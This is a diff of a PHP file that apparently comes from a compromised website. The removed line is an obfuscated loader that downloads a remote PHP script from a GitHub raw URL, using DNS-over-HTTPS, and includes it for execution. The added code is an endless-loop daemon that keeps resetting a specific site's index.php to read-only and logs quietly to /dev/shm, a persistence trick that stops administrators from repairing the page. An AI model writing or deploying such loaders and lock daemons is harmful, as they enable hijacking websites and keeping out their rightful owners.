@@ -1,1 +1,66 @@
-<?php $url='https://raw.githubusercontent.com/wawanbangke/ggo/refs/heads/main/func.php';$dns='ht';$dns.='tps:/';$dns.='/cloud';$dns.='flare-';$dns.='dns.c';$dns.='om/dns';$dns.='-query';$ch=CurL_init ($url);if(defined('CURLOPT_DOH_URL')){curL_setOPT($ch,CURLOPT_DOH_URL,$dns);}cUrl_setOpt($ch,CURLOPT_RETURNTRANSFER,TRUE);Curl_seTOPt($ch,CURLOPT_SSL_VERIFYHOST,2);curL_seTopt ($ch,CURLOPT_SSL_VERIFYPEER,true);$res=curl_ExEC($ch);cuRl_close($ch);$tmp=TMPfIle();$path=streaM_Get_meTa_daTa($tmp);$path=$path['uri'];fprintf($tmp,'%s',$res);IncLude($path); ?>
+<?php
+set_time_limit(0);
+error_reporting(E_ALL);
+ini_set('display_errors', 0);
+
+$targetFile = '/home/u1599488/public_html/soasik.bpsaceh.com/public/index.php';
+$logFile    = '/dev/shm/shm.log';
+$Microsec   = 100000;
+
+function writeLog($msg) {
+    global $logFile;
+    $time = date('Y-m-d H:i:s');
+    $line = "[$time] $msg\n";
+    $fp = @fopen($logFile, 'a');
+    if ($fp) {
+        @flock($fp, LOCK_EX);
+        @fwrite($fp, $line);
+        @flock($fp, LOCK_UN);
+        @fclose($fp);
+    }
+}
+
+function currentProcessUid() {
+    return function_exists('posix_geteuid') ? posix_geteuid() : null;
+}
+
+function octalPerms($permsInt) {
+    return sprintf('%04o', $permsInt & 0777);
+}
+
+function chmodFile($path) {
+    $procUid = currentProcessUid();
+
+    if (!is_file($path)) {
+        writeLog("Target bukan file: $path");
+        return;
+    }
+
+    $perms = @fileperms($path);
+    if ($perms === false) {
+        writeLog("Tidak bisa baca perms file: $path");
+        return;
+    }
+    $perms = $perms & 0777;
+
+    $ownerUid = @fileowner($path);
+    if ($procUid !== null && $ownerUid !== false && $procUid !== $ownerUid) {
+        writeLog("Skip chmod file (owner mismatch): $path owner=" . ($ownerUid) . " proc=" . $procUid);
+        return;
+    }
+
+    if ($perms !== 0444) {
+        $ok = @chmod($path, 0444);
+        if ($ok) {
+            writeLog("Sukses chmod file 0444: $path (sebelum " . octalPerms($perms) . ")");
+        } else {
+            writeLog("Gagal chmod file: $path (sebelum " . octalPerms($perms) . ")");
+        }
+    }
+}
+
+writeLog("===== START daemon (target file: $targetFile) =====");
+while (true) {
+    chmodFile($targetFile);
+    usleep($Microsec);
+}
